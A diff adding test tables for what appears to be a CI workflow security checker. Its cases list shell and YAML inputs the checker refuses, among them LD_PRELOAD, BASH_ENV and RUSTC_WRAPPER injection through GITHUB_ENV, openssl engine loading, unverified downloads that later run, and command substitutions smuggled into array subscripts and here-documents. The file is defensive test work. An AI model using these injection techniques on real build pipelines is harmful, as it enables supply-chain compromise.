+        _r7_steps("      - run: echo ${{ matrix.k }}\n", head=R9_SEQ % "          a: b\n"), None, 1, "mapping or sequence"),
+    "r9 F8: a flow list of mappings spliced into run is refused": (
+        _r7_steps("      - run: echo ${{ matrix.k }}\n", head=R8_MATRIX % "{a: 1}, {b: 2}"), None, 1, "subset grammar"),
+    "r9 F8: a block list of mappings spliced into run is refused": (
+        _r7_steps("      - run: echo ${{ matrix.k }}\n", head=R9_SEQ % "          - a: 1\n"), None, 1, "mapping or sequence"),
+    "r9 F8: an include entry holding a mapping spliced into run is refused": (
+        _r7_steps("      - run: echo ${{ matrix.k }}\n", head="    strategy:\n      matrix:\n        include:\n          - k:\n              a: b\n"), None, 1, "mapping or sequence"),
+    "r9 F8: an include entry holding a flow mapping spliced into run is refused": (
+        _r7_steps("      - run: echo ${{ matrix.k }}\n", head="    strategy:\n      matrix:\n        include:\n          - k: {a: b}\n"), None, 1, "subset grammar"),
+    "r9 F8: a mapping-valued matrix key that run never names passes": (
+        _r7_steps("      - run: echo ok\n", head=R9_SEQ % "          a: b\n"), None, 0, ""),
+    "r9 F8: a plain list spliced into run passes": (_r7_steps("      - run: echo ${{ matrix.k }}\n", head=R8_MATRIX % "a, b"), None, 0, ""),
+    # --- F10: openssl options that load code, and a verify key outside the repository.
+    "r9 F10: openssl -engine is refused": (_r8("openssl req -engine ./x.so -new"), None, 1, "openssl"),
+    "r9 F10: openssl -provider is refused": (_r8("openssl req -provider ./x -new"), None, 1, "openssl"),
+    "r9 F10: openssl -provider-path is refused": (_r8("openssl req -provider-path ./x -new"), None, 1, "openssl"),
+    "r9 F10: openssl -modulepath is refused": (_r8("openssl req -modulepath ./x -new"), None, 1, "openssl"),
+    "r9 F10: openssl -config of a computed path is refused": (_r8("openssl req -config \"$C\" -new"), None, 1, "openssl"),
+    "r9 F10: openssl -conf of a computed path is refused": (_r8("openssl x509 -conf $C -noout"), None, 1, "openssl"),
+    "r9 F10: openssl -config of a literal path passes": (_r8("openssl req -config ci/openssl.cnf -new -x509 -days 1 -nodes -keyout k -out c"), None, 0, ""),
+    "r9 F10: openssl dgst -verify of a computed key is refused": (_r8("openssl dgst -sha256 -verify \"$K\" -signature s f"), None, 1, "openssl"),
+    "r9 F10: openssl dgst -verify of a repository key passes": (_r8("openssl dgst -sha256 -verify keys/pub.pem -signature s f"), None, 0, ""),
+    "r9 F10: openssl dgst -verify of a parent path key is refused": (_r8("openssl dgst -sha256 -verify ../pub.pem -signature s f"), None, 1, "openssl"),
+    "r9 F10: openssl pkeyutl is refused": (_r8("openssl pkeyutl -verify -inkey k -in f -sigfile s"), None, 1, "openssl"),
+    "r9 F10: openssl rand passes": (_r8("openssl rand -hex 8"), None, 0, ""),
+    # --- sec F1: a dangerous variable is refused in EVERY run step, in an `env:` of any step (a `uses:` step too) and in GITHUB_ENV.
+    "r9 sec F1: export LD_PRELOAD then cargo is refused": (_r8("export LD_PRELOAD=./x.so", "cargo build --locked"), None, 1, "LD_PRELOAD"),
+    "r9 sec F1: a GITHUB_ENV line for LD_PRELOAD is refused": (_r8("echo \"LD_PRELOAD=./x.so\" >> \"$GITHUB_ENV\""), None, 1, "LD_PRELOAD"),
+    "r9 sec F1: a GITHUB_ENV line for BASH_ENV in a group is refused": (
+        _r8("{ echo \"A=1\"; echo \"BASH_ENV=./x\"; } >> \"$GITHUB_ENV\""), None, 1, "BASH_ENV"),
+    "r9 sec F1: a GITHUB_ENV line with a computed name is refused": (_r8("echo \"$L\" >> \"$GITHUB_ENV\""), None, 1, "computed"),
+    "r9 sec F1: a GITHUB_ENV line after a printf format name is refused": (_r8("printf '%s\\n' \"X=1\" >> \"$GITHUB_ENV\""), None, 1, "computed"),
+    "r9 sec F1: two GITHUB_ENV lines in one echo are read per line": (
+        _r8("echo -e \"A=1\\nLD_PRELOAD=./x\" >> \"$GITHUB_ENV\""), None, 1, "echo -e"),
+    "r9 sec F1: a GITHUB_ENV write by cat is refused": (_r8("cat ci/env.txt >> \"$GITHUB_ENV\""), None, 1, "cat"),
+    "r9 sec F1: a GITHUB_ENV here-document is refused": (_r8("cat >> \"$GITHUB_ENV\" <<EOF", "A=1", "EOF"), None, 1, "GITHUB_ENV"),
+    "r9 sec F1: GITHUB_ENV held in a variable is refused": (_r8("F=\"$GITHUB_ENV\"", "echo \"A=1\" >> \"$F\""), None, 1, "GITHUB_ENV"),
+    "r9 sec F1: an ordinary GITHUB_ENV line passes": (_r8("echo \"CI_IMAGE_TAG=${img_tag}\" >> \"$GITHUB_ENV\""), None, 0, ""),
+    "r9 sec F1: a GITHUB_ENV group of ordinary lines passes": (
+        _r8("{ echo \"A=1\"; echo \"B=${C}\"; } >> \"$GITHUB_ENV\"", "echo \"::notice::done\""), None, 0, ""),
+    "r9 sec F1: inline LD_PRELOAD before cargo is refused": (_r8("LD_PRELOAD=./x.so cargo build --locked"), None, 1, "LD_PRELOAD"),
+    "r9 sec F1: env -i is refused": (_r8("env -i cargo build --locked"), None, 1, "env"),
+    "r9 sec F1: env VAR=value is refused": (_r8("env BASH_ENV=./x bash ci/x.sh"), None, 1, "env"),
+    "r9 sec F1: declare of PATH is refused": (_r8("declare -x PATH=./bin:$PATH", "cargo build --locked"), None, 1, "PATH"),
+    "r9 sec F1: a uses step env BASH_ENV is refused": (
+        _r7_steps("      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262\n        env:\n          BASH_ENV: ./x\n"), None, 1, "BASH_ENV"),
+    "r9 sec F1: a run step env LD_PRELOAD is refused": (_r7_steps("      - run: cargo build --locked\n        env:\n          LD_PRELOAD: ./x.so\n"), None, 1, "LD_PRELOAD"),
+    "r9 sec F1: a uses step env that passes a uses output passes": (
+        _r7_steps("      - id: u\n        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262\n",
+                  "      - run: cargo build --locked\n        env:\n          NDK_PATH: ${{ steps.u.outputs.p }}\n"), None, 0, ""),
+    # --- sec F2: the variables that pick a program for cargo, rustc, rustup, a C toolchain or openssl.
+    "r9 sec F2: step env RUSTC_WRAPPER is refused": (_r7_steps("      - run: cargo build --locked\n        env:\n          RUSTC_WRAPPER: ./x\n"), None, 1, "RUSTC_WRAPPER"),
+    "r9 sec F2: inline CARGO_BUILD_RUSTC_WRAPPER is refused": (_r8("CARGO_BUILD_RUSTC_WRAPPER=./x cargo build --locked"), None, 1, "CARGO_BUILD_RUSTC_WRAPPER"),
+    "r9 sec F2: a GITHUB_ENV line for RUSTC_WRAPPER is refused": (
+        _r7_steps("      - run: echo \"RUSTC_WRAPPER=./x\" >> \"$GITHUB_ENV\"\n", "      - run: cargo build --locked\n"), None, 1, "RUSTC_WRAPPER"),
+    "r9 sec F2: RUSTC is refused": (_r8("RUSTC=./x cargo build --locked"), None, 1, "RUSTC"),
+    "r9 sec F2: RUSTDOC is refused": (_r8("export RUSTDOC=./x"), None, 1, "RUSTDOC"),
+    "r9 sec F2: RUSTC_WORKSPACE_WRAPPER is refused": (_r8("RUSTC_WORKSPACE_WRAPPER=./x cargo build --locked"), None, 1, "RUSTC_WORKSPACE_WRAPPER"),
+    "r9 sec F2: RUSTFLAGS with a linker is refused": (_r8("export RUSTFLAGS=\"-C linker=./x\""), None, 1, "RUSTFLAGS"),
+    "r9 sec F2: RUSTFLAGS with -Z is refused": (_r8("RUSTFLAGS=\"-Zunstable-options\" cargo build --locked"), None, 1, "RUSTFLAGS"),
+    "r9 sec F2: RUSTFLAGS with link-arg is refused": (_r8("RUSTFLAGS=\"-C link-arg=-fuse-ld=./x\" cargo build --locked"), None, 1, "RUSTFLAGS"),
+    "r9 sec F2: a computed RUSTFLAGS is refused": (_r8("RUSTFLAGS=\"$F\" cargo build --locked"), None, 1, "RUSTFLAGS"),
+    "r9 sec F2: CARGO_ENCODED_RUSTFLAGS with a linker is refused": (_r8("CARGO_ENCODED_RUSTFLAGS=\"-Clinker=./x\" cargo build --locked"), None, 1, "CARGO_ENCODED_RUSTFLAGS"),
+    "r9 sec F2: RUSTFLAGS with a target feature passes": (_r8("RUSTFLAGS=\"-C target-cpu=native\" cargo build --locked"), None, 0, ""),
+    "r9 sec F2: CARGO_TARGET linker is refused": (_r8("CARGO_TARGET_X86_64_UNKNOWN_LINUX_GNU_LINKER=./x cargo build --locked"), None, 1, "LINKER"),
+    "r9 sec F2: CARGO_TARGET runner is refused": (_r8("CARGO_TARGET_X86_64_UNKNOWN_LINUX_GNU_RUNNER=./x cargo test --locked"), None, 1, "RUNNER"),
+    "r9 sec F2: CARGO_HOME is refused": (_r8("CARGO_HOME=./h cargo build --locked"), None, 1, "CARGO_HOME"),
+    "r9 sec F2: CARGO_HTTP_PROXY is refused": (_r8("CARGO_HTTP_PROXY=http://x cargo build --locked"), None, 1, "CARGO_HTTP"),
+    "r9 sec F2: CARGO_REGISTRIES index is refused": (_r8("CARGO_REGISTRIES_X_INDEX=sparse+http://x cargo build --locked"), None, 1, "CARGO_REGISTRIES"),
+    "r9 sec F2: CARGO_NET_GIT_FETCH_WITH_CLI is refused": (_r8("CARGO_NET_GIT_FETCH_WITH_CLI=true cargo build --locked"), None, 1, "CARGO_NET"),
+    "r9 sec F2: CARGO_ALIAS is refused": (_r8("CARGO_ALIAS_B=./x cargo build --locked"), None, 1, "CARGO_ALIAS"),
+    "r9 sec F2: RUSTUP_TOOLCHAIN is refused": (_r8("RUSTUP_TOOLCHAIN=./t cargo build --locked"), None, 1, "RUSTUP_TOOLCHAIN"),
+    "r9 sec F2: RUSTUP_DIST_SERVER is refused": (_r8("RUSTUP_DIST_SERVER=http://x cargo build --locked"), None, 1, "RUSTUP_DIST_SERVER"),
+    "r9 sec F2: CC is refused": (_r8("CC=./x cargo build --locked"), None, 1, "`CC`"),
+    "r9 sec F2: CXX is refused": (_r8("export CXX=./x"), None, 1, "CXX"),
+    "r9 sec F2: AR_target is refused": (_r8("AR_x86_64_unknown_linux_gnu=./x cargo build --locked"), None, 1, "AR_"),
+    "r9 sec F2: LDFLAGS is refused": (_r8("LDFLAGS=-L./x cargo build --locked"), None, 1, "LDFLAGS"),
+    "r9 sec F2: OPENSSL_CONF is refused": (_r8("OPENSSL_CONF=./x openssl rand -hex 8"), None, 1, "OPENSSL_CONF"),
+    "r9 sec F2: OPENSSL_MODULES is refused": (_r8("export OPENSSL_MODULES=./x"), None, 1, "OPENSSL_MODULES"),
+    "r9 sec F2: the Android NDK lines of the release job pass": (
+        _r8("TC=\"$NDK/toolchains/llvm/prebuilt/linux-x86_64/bin\"",
+            "{ echo \"CC_aarch64_linux_android=$TC/aarch64-linux-android24-clang\"; echo \"AR_i686_linux_android=$TC/llvm-ar\"; "
+            "echo \"CARGO_TARGET_AARCH64_LINUX_ANDROID_LINKER=$TC/aarch64-linux-android24-clang\"; } >> \"$GITHUB_ENV\""), None, 0, ""),
+    "r9 sec F2: an Android NDK name with another value is refused": (
+        _r8("echo \"CC_aarch64_linux_android=./evil\" >> \"$GITHUB_ENV\""), None, 1, "CC_aarch64_linux_android"),
+    "r9 sec F2: an Android NDK name outside the toolchain directory is refused": (
+        _r8("echo \"CARGO_TARGET_I686_LINUX_ANDROID_LINKER=/opt/evil\" >> \"$GITHUB_ENV\""), None, 1, "LINKER"),
+    "r9 sec F2: a C compiler for another target is refused": (_r8("echo \"CC_x86_64_unknown_linux_gnu=$TC/clang\" >> \"$GITHUB_ENV\""), None, 1, "CC_x86_64"),
+    "r9 sec F2: CARGO_REGISTRY_TOKEN passes": (
+        _r7_steps("      - run: cargo build --locked\n        env:\n          CARGO_REGISTRY_TOKEN: ${{ secrets.T }}\n"), None, 0, ""),
+    "r9 sec F2: CARGO_TERM_COLOR and CARGO_INCREMENTAL pass": (
+        _r7_steps("      - run: cargo build --locked\n        env:\n          CARGO_TERM_COLOR: always\n          CARGO_INCREMENTAL: \"0\"\n"), None, 0, ""),
+    # --- sec F3: an indirect reference to a download (a variable, an env value, a bare glob, a PATH entry) is refused.
+    "r9 sec F3: a download renamed through an env variable is refused": (
+        _r7_steps("      - run: curl -fsSL -o run.sh https://x.example/run.sh\n",
+                  "      - run: cp \"$F\" x.sh\n        env:\n          F: run.sh\n", "      - run: bash x.sh\n"), None, 1, "run.sh"),
+    "r9 sec F3: a download extracted through an env variable is refused": (
+        _r7_steps("      - run: curl -fsSL -o a.tgz https://x.example/a.tgz\n",
+                  "      - run: tar xzf \"$F\"\n        env:\n          F: a.tgz\n"), None, 1, "a.tgz"),
+    "r9 sec F3: a download named by a variable of the script is refused": (
+        _r7_steps("      - run: curl -fsSL -o run.sh https://x.example/run.sh\n", "      - run: |\n          F=run.sh\n          cp \"$F\" x.sh\n"), None, 1, "run.sh"),
+    "r9 sec F3: a download named by a uses step with value is refused": (
+        _r7_steps("      - run: curl -fsSL -o tool https://x.example/tool\n",
+                  "      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262\n        with:\n          path: tool\n"), None, 1, "tool"),
+    "r9 sec F3: a bare glob over the directory of a download is refused": (
+        _r7_steps("      - run: |\n          mkdir -p d\n          curl -fsSL -o d/rustc https://x.example/rustc\n",
+                  "      - run: chmod +x d/*\n"), None, 1, "bare glob"),
+    "r9 sec F3: a bare glob in the working directory is refused": (
+        _r7_steps("      - run: curl -fsSL -o tool https://x.example/tool\n", "      - run: chmod +x *\n"), None, 1, "bare glob"),
+    "r9 sec F3: a dot slash glob in the working directory is refused": (
+        _r7_steps("      - run: curl -fsSL -o tool https://x.example/tool\n", "      - run: chmod +x ./*\n"), None, 1, "bare glob"),
+    "r9 sec F3: ls in a substitution over the download directory is refused": (
+        _r7_steps("      - run: curl -fsSL -o tool https://x.example/tool\n", "      - run: cp $(ls) y\n"), None, 1, "ls"),
+    "r9 sec F3: a download directory on GITHUB_PATH is refused": (
+        _r7_steps("      - run: |\n          mkdir -p d\n          curl -fsSL -o d/rustc https://x.example/rustc\n",
+                  "      - run: echo \"$PWD/d\" >> \"$GITHUB_PATH\"\n"), None, 1, "GITHUB_PATH"),
+    "r9 sec F3: the glob and PATH forms of a download tool are refused together": (
+        _r7_steps("      - run: |\n          mkdir -p d\n          curl -fsSL -o d/rustc https://x.example/rustc\n",
+                  "      - run: |\n          chmod +x d/*\n          echo \"$PWD/d\" >> \"$GITHUB_PATH\"\n", "      - run: cargo build --locked\n"), None, 1, "bare glob"),
+    "r9 sec F3: a GITHUB_PATH entry elsewhere passes": (
+        _r7_steps("      - run: |\n          mkdir -p d\n          curl -fsSL -o d/rustc https://x.example/rustc\n",
+                  "      - run: echo \"$HOME/.local/bin\" >> \"$GITHUB_PATH\"\n"), None, 0, ""),
+    "r9 sec F3: a glob over another directory passes": (
+        _r7_steps("      - run: |\n          mkdir -p d\n          curl -fsSL -o d/rustc https://x.example/rustc\n", "      - run: rm -f out/*\n"), None, 0, ""),
+    "r9 sec F3: a named glob passes when nothing was downloaded": (_r8("chmod +x *"), None, 0, ""),
+    "r9 sec F3: env RUSTC naming a download is refused twice over": (
+        _r7_steps("      - run: curl -fsSL -o r https://x.example/r\n", "      - run: cargo build --locked\n        env:\n          RUSTC: ./r\n"), None, 2, "RUSTC"),
+    "r9 sec F3: a verified download renamed in the same step passes": (
+        _r7_steps("      - run: curl -fsSL -o f https://x.example/f\n",
+                  "      - run: |\n          echo \"${SUM}  f\" | sha256sum -c -\n          cp f g\n"), None, 0, ""),
+    "r9 sec F3: a digest written to GITHUB_ENV by an earlier step is a self-made digest": (
+        _r7_steps("      - run: echo \"SUM=$(printf x | sha256sum)\" >> \"$GITHUB_ENV\"\n",
+                  "      - run: |\n          curl -fsSL -o f https://x.example/f\n          echo \"${SUM}  f\" | sha256sum -c -\n          tar xzf f\n"), None, 1, "own checksum"),
+    "r9 sec F3: a checksum file verified by a literal digest then used passes": (
+        _r8(R7_FETCH, "curl -fsSL -o f.sum https://x.example/f.sum", f"echo \"{R9_HEX}  f.sum\" | sha256sum -c -",
+            "sha256sum -c f.sum", "tar xzf f"), None, 0, ""),
+    "r9 sec F3: a checksum file that nothing verified is refused": (
+        _r8(R7_FETCH, "curl -fsSL -o f.sum https://x.example/f.sum", "sha256sum -c f.sum", "tar xzf f"), None, 1, "checksum"),
+    "r9 sec K01: a pinned literal digest then tar passes": (_r8(R7_FETCH, f"echo \"{R9_HEX}  f\" | sha256sum -c -", "tar xzf f"), None, 0, ""),
+    "r9 sec K03: gh attestation verify then tar passes": (
+        _r7_steps("      - run: curl -fsSL -o f https://x.example/f\n",
+                  "      - run: |\n          gh attestation verify f -R o/r\n          tar xzf f\n"), None, 0, ""),
+    "r9 sec K04: cargo install of a pinned version passes": (_r8("cargo install cargo-cyclonedx --locked --version 0.5.7"), None, 0, ""),
+}
+
+
+# Round 11 (code r10 F1-F3): (document, files, message count, needle). F1: a quoted span inside `${...}` is scanned like the
+# word around it. F2: a here-document body under an unquoted delimiter is expanded, so it is scanned as double-quoted text; under
+# a quoted delimiter it is literal. F3: `@` is an operator only right after the parameter name or its subscript.
+R11_CASES: Dict[str, Tuple[str, Optional[Dict[str, str]], int, str]] = {
+    "r11 F2: ${X@P} in an unquoted here-document body is refused": (_r8("X='$(./f)'", "cat <<E", "${X@P}", "E"), None, 1, "parameter transformation"),
+    "r11 F2: a command substitution in an unquoted here-document body is refused": (_r8("cat <<E", "$(./f)", "E"), None, 1, ""),
+    "r11 F2: a backtick in an unquoted here-document body is refused": (_r8("cat <<E", "`./f`", "E"), None, 1, ""),
+    "r11 F2: ${X@P} in a <<- here-document body is refused (YAML forbids a tab, so the body has none)": (_r8("X='$(./f)'", "cat <<-E", "${X@P}", "E"), None, 1, "parameter transformation"),
+    "r11 F2: a command substitution in a <<- here-document body is refused (YAML forbids a tab, so the body has none)": (_r8("cat <<-E", "$(./f)", "E"), None, 1, ""),
+    "r11 F2: a command substitution in the body of the second of two here-documents is refused": (
+        _r8("cat <<A <<B", "plain", "A", "$(./f)", "B"), None, 1, ""),
+    "r11 F2: a multi-line command substitution in the first of two here-document bodies keeps its own state": (
+        _r8("cat <<A <<B", "$(echo", ")", "A", "b", "B"), None, 0, ""),
+    "r11 F2: an escaped dollar in an unquoted here-document body is literal": (_r8("cat <<E", "\\$(./f)", "E"), None, 0, ""),
+    "r11 F2: plain text and a variable in an unquoted here-document body pass": (_r8("cat <<E", "hello $HOME", "E"), None, 0, ""),
+    "r11 F2: a single-quoted delimiter keeps the body literal": (_r8("cat <<'E'", "${X@P} $(./f) `./f`", "E"), None, 0, ""),
+    "r11 F2: a double-quoted delimiter keeps the body literal": (_r8("cat <<\"E\"", "${X@P} $(./f) `./f`", "E"), None, 0, ""),
+    "r11 F2: a backslash delimiter keeps the body literal": (_r8("cat <<\\E", "${X@P} $(./f) `./f`", "E"), None, 0, ""),
+    "r11 F2: a quoted <<- delimiter keeps the body literal": (_r8("cat <<-'E'", "$(./f)", "E"), None, 0, ""),
+    "r11 F1: ${X@P} in double quotes inside ${X:-...} is refused": (_r8("Y='$(./f)'", 'echo ${X:-"${Y@P}"}'), None, 1, "parameter transformation"),
+    "r11 F1: a command substitution in double quotes inside ${X:-...} is refused": (_r8('echo ${X:-"$(./f)"}'), None, 1, "command substitution"),
+    "r11 F1: a command substitution in single quotes inside a double-quoted ${X:-...} is refused": (
+        _r8("echo \"${X:-'$(./f)'}\""), None, 1, "command substitution"),
+    "r11 F1: a backtick in double quotes inside ${X:-...} is refused": (_r8('echo ${X:-"`./f`"}'), None, 1, "command substitution"),
+    "r11 F1: ${X@P} in single quotes inside ${X:-...} is refused": (_r8("Y='$(./f)'", "echo ${X:-'${Y@P}'}"), None, 1, "parameter transformation"),
+    "r11 F1: a quoted default word without an expansion passes": (_r8('echo ${X:-"a b"} ${Y:-\'c d\'}'), None, 0, ""),
+    "r11 F1: a closing brace inside quotes does not end the expansion": (_r8('echo ${X:-"}"}'), None, 0, ""),
+    "r11 F3: an at sign in a default word passes": (_r8("echo ${X:-me@host}"), None, 0, ""),
+    "r11 F3: an at sign in a quoted default word passes": (_r8('echo ${X:-"me@host"}'), None, 0, ""),
+    "r11 F3: an at sign in a pattern removal passes": (_r8("echo ${X#*@a} ${X%@a} ${X//@a/b} ${X:+u@host}"), None, 0, ""),
+    "r11 F3: ${ary[@]} ${!ary[@]} ${@} and \"$@\" pass": (_r8("echo ${ary[@]} ${!ary[@]} ${@} \"$@\" ${#ary[@]}"), None, 0, ""),
+    "r11 F3: ${X@P} right after the name is still refused": (_r8("echo ${X@P}"), None, 1, "parameter transformation"),
+    "r11 F3: ${ary[@]@P} right after the subscript is still refused": (_r8("echo ${ary[@]@P}"), None, 1, "parameter transformation"),
+    "r11 F3: ${!N@P} after an indirection is still refused": (_r8("echo ${!N@P}"), None, 1, "parameter transformation"),
+    "r11 F3: ${ary[${X@P}]} in a subscript is still refused": (_r8("echo ${ary[${X@P}]}"), None, 1, "parameter transformation"),
+    "r11 F2 sec r10 S01: a quoted subscript holding a command substitution then ${!X} indirection is refused": (
+        _r8("X='a[$(./f)]'", 'echo ${!X}'), None, 1, "array subscript"),
+    "r11 F2 sec r10 S03: a quoted subscript holding a command substitution then declare -n nameref is refused": (
+        _r8("X='a[$(./f)]'", 'declare -n N=X'), None, 1, "array subscript"),
+    "r11 F2 sec r10 S08: a quoted subscript holding a command substitution then [[ X -eq 0 ]] test is refused": (
+        _r8("X='a[$(./f)]'", '[[ $X -eq 0 ]]'), None, 1, "array subscript"),
+    "r11 F2 sec r10 S10: a quoted subscript holding a command substitution then $(( X )) arithmetic is refused": (
+        _r8("X='a[$(./f)]'", 'echo $(( X ))'), None, 1, "array subscript"),
+    "r11 F2 sec r10 S12: a quoted subscript holding a command substitution then ${ary[X]} subscript is refused": (
+        _r8("X='a[$(./f)]'", 'echo ${ary[X]}'), None, 1, "array subscript"),
+    "r11 F2 sec r10 S21: a quoted subscript holding a command substitution then printf -v target is refused": (
+        _r8("X='a[$(./f)]'", 'printf -v "$X" %s v'), None, 1, "array subscript"),
+    "r11 F2 sec r10 S22: a quoted subscript holding a command substitution then test -v operand is refused": (
+        _r8("X='a[$(./f)]'", 'test -v "$X"'), None, 1, "array subscript"),
+    "r11 F2 sec r10 S27: a quoted subscript holding a command substitution then declare -i Y=X is refused": (
+        _r8("X='a[$(./f)]'", 'declare -i Y=X'), None, 1, "array subscript"),
+    "r11 F2 sec r10 S28: a quoted subscript holding a command substitution then ${S:X:1} offset is refused": (
+        _r8("X='a[$(./f)]'", 'echo ${S:X:1}'), None, 1, "array subscript"),
+    "r11 F2 sec r10: a quoted subscript holding a backtick is refused": (_r8("X='a[`./f`]'", "echo $(( X ))"), None, 1, "array subscript"),
+    "r11 F2 sec r10: a quoted subscript holding a ${Y@P} transformation is refused": (
+        _r8("X='a[${Y@P}]'", "echo $(( X ))"), None, 1, "array subscript"),
+    "r11 F2 sec r10: an escaped dollar in double quotes does not hide the subscript": (_r8('X="a[\\$(./f)]"', "echo $(( X ))"), None, 1, "array subscript"),
+    "r11 F2 sec r10 H7: a step env value holding a subscript with a substitution is refused": (
+        _r7_steps("      - run: echo $(( X ))\n        env:\n          X: 'a[$(./f)]'\n"), None, 1, "array subscript"),
+    "r11 F2 sec r10: a job env value holding a subscript with a substitution is refused": (
+        _r7_steps("      - run: echo $(( X ))\n", head="    env:\n      X: 'a[$(./f)]'\n"), None, 1, "array subscript"),
+    "r11 F2 sec r10: a plain subscript in a quoted value passes": (_r8("X='a[1]'", "echo $(( X ))"), None, 0, ""),
+    "r11 F2 sec r10: a variable subscript in an expansion passes": (_r8("echo ${ary[$i]} ${ary[i+1]} ${#ary[@]}"), None, 0, ""),
+    "r11 F2 sec r10: a plain subscript in an env value passes": (
+        _r7_steps("      - run: echo ok\n        env:\n          X: 'a[1]'\n"), None, 0, ""),
+    "r11 F3 sec r10: an e-mail address in a default word passes (H8)": (_r8("echo ${E:-ci@host}"), None, 0, ""),
+    "r11 F3 sec r10: an at sign in a substitution pattern passes": (_r8("echo ${E/@example/x}"), None, 0, ""),
+}
+
+
+# Round 12 (code r11 F1-F3): (document, files, message count, needle). F1: a here-document delimiter is a plain word in at most
+# one whole quote pair or after one backslash, else it is refused. F2: a `[` that opens a subscript is followed by no
+# substitution anywhere in the rest of the word (no `]` stop), in words and `env:` values. F3: a re-evaluating context
+# (`$(( ))`, `(( ))`, `[[ -eq ]]`, `declare -i`, `${!name}`, `declare -n`, `test -v`, a substring offset, a read subscript)
+# is refused on a non-literal operand, and `$'..'` with an escape and `printf -v` are refused outright.
+_R12_ENV_STEP = "      - run: echo $(( X ))\n        env:\n          X: '%s'\n"
+R12_CASES: Dict[str, Tuple[str, Optional[Dict[str, str]], int, str]] = {
+    # --- F1: refused delimiters (red at c3c0223d4).
+    "r12 F1 H17: a delimiter with a backslash-escaped blank is refused": (_r8("cat <<E\\ F", "body", "E F", "./f", "E"), None, 1, "here-document delimiter"),
+    "r12 F1 H18: a dollar-quoted delimiter is refused": (_r8("cat <<$'E'", "body", "E", "./f", "$E"), None, 1, "here-document delimiter"),
+    "r12 F1 H19: a quoted delimiter with a blank is refused": (_r8("cat <<'E F'", "body", "E F", "./f", "'", "E"), None, 1, "here-document delimiter"),
+    "r12 F1: an empty quoted pair after the word is refused": (_r8("cat <<E\"\"", "body", "E", "./f"), None, 1, "here-document delimiter"),
+    "r12 F1: a dollar-double-quoted delimiter is refused": (_r8("cat <<$\"E\"", "body", "E", "./f"), None, 1, "here-document delimiter"),
+    "r12 F1: a quote pair in the middle of the word is refused": (_r8("cat <<E'F'", "body", "EF", "./f"), None, 1, "here-document delimiter"),
+    "r12 F1: text after the closing quote is refused": (_r8("cat <<'E'x", "body", "Ex", "./f"), None, 1, "here-document delimiter"),
+    "r12 F1: a quote that does not close is refused": (_r8("cat <<'E", "body", "E", "./f"), None, 1, "here-document delimiter"),
+    "r12 F1: a backslash inside the word is refused": (_r8("cat <<E\\F", "body", "EF", "./f"), None, 1, "here-document delimiter"),
+    "r12 F1: a quoted delimiter with a dash is refused": (_r8("cat <<'E-1'", "body", "E-1", "./f"), None, 1, "here-document delimiter"),
+    # --- F1: accepted delimiters (green at both).
+    "r12 F1 ok: <<'E' passes": (_r8("cat <<'E'", "$(./f)", "E"), None, 0, ""),
+    "r12 F1 ok: <<\"E\" passes": (_r8("cat <<\"E\"", "$(./f)", "E"), None, 0, ""),
+    "r12 F1 ok: <<\\E passes": (_r8("cat <<\\E", "$(./f)", "E"), None, 0, ""),
+    "r12 F1 ok: <<E passes": (_r8("cat <<E", "plain", "E"), None, 0, ""),
+    "r12 F1 ok: <<-E passes": (_r8("cat <<-E", "plain", "E"), None, 0, ""),
+    "r12 F1 ok: << 'E' with a blank passes (release.yml FORMULA_EOF shape)": (_r8("cat > f << 'FORMULA_EOF'", "$(./f)", "FORMULA_EOF"), None, 0, ""),
+    "r12 F1 ok: <<E_1 passes": (_r8("cat <<E_1", "plain", "E_1"), None, 0, ""),
+    "r12 F1 ok: <<'MODULEMAP' with a redirect passes (release.yml shape)": (_r8("cat > f <<'MODULEMAP'", "$(./f)", "MODULEMAP"), None, 0, ""),
+    "r12 F1 ok: <<MSG passes (c8-precheck.yml shape)": (_r8("cat <<MSG", "plain", "MSG"), None, 0, ""),
+    # --- F2: nested or quoted ] before a substitution (red at c3c0223d4).
+    "r12 F2 A1: a nested subscript before a substitution is refused": (_r8("X='a[b[1]+$(./f)]'", "echo $(( X ))"), None, 1, "array subscript"),
+    "r12 F2 A7: a quoted ] before a substitution is refused": (_r8("X='a[\"]\"$(./f)]'", "echo $(( X ))"), None, 1, "array subscript"),
+    "r12 F2 E1: an env value with a nested subscript is refused": (_r7_steps(_R12_ENV_STEP % "a[b[1]+$(./f)]"), None, 1, "array subscript"),
+    "r12 F2: a closed subscript then a substitution in a word is refused": (_r8("echo \"x[y]$(true)\""), None, 1, "array subscript"),
+    "r12 F2: a closed subscript then a transformation is refused": (_r8("X='a[b]${Y@P}'", "echo $(( X ))"), None, 1, "array subscript"),
+    "r12 F2: an env value with a closed subscript then a substitution is refused": (_r7_steps(_R12_ENV_STEP % "a[b]$(./f)"), None, 1, "array subscript"),
+    "r12 F2: an env value with a backtick after a subscript is refused": (_r7_steps(_R12_ENV_STEP % "a[b]`./f`"), None, 1, "array subscript"),
+    # --- F2: accepted (green at both).
+    "r12 F2 ok: ${ary[@]} passes": (_r8("echo ${ary[@]}"), None, 0, ""),
+    "r12 F2 ok: \"$@\" passes": (_r8("echo \"$@\""), None, 0, ""),
+    "r12 F2 ok: ${X:-me@host} passes": (_r8("echo ${X:-me@host}"), None, 0, ""),
+    "r12 F2 ok: a closed subscript with no substitution passes": (_r8("X='a[1]b[2]'", "echo $X"), None, 0, ""),
+    "r12 F2 ok: a plain env value passes": (_r7_steps("      - run: echo ok\n        env:\n          X: 'a[1]b'\n"), None, 0, ""),
+    # --- F3: refused (red at c3c0223d4).
+    "r12 F3 A2: an ANSI-C string with an escape is refused": (_r8("X=$'a[\\x24(./f)]'", "echo $(( X ))"), None, 1, "ANSI-C"),
+    "r12 F3 A3: two halves joined by concatenation then used as a number are refused": (
+        _r8("A='a['", "B='$(./f)]'", "X=$A$B", "echo $(( X ))"), None, 1, "non-literal operand"),
+    "r12 F3 A4: += append then used as a number is refused": (_r8("X='a['", "X+='$(./f)]'", "echo $(( X ))"), None, 1, "non-literal operand"),
+    "r12 F3 A5: printf -v is refused": (_r8("printf -v X 'a[%s(./f)]' '$'", "echo $(( X ))"), None, 1, "printf -v"),
+    "r12 F3: printf -v of any text is refused": (_r8("printf -v Y %s ok"), None, 1, "printf -v"),
+    "r12 F3: an ANSI-C string with a tab escape is refused": (_r8("echo $'a\\tb'"), None, 1, "ANSI-C"),
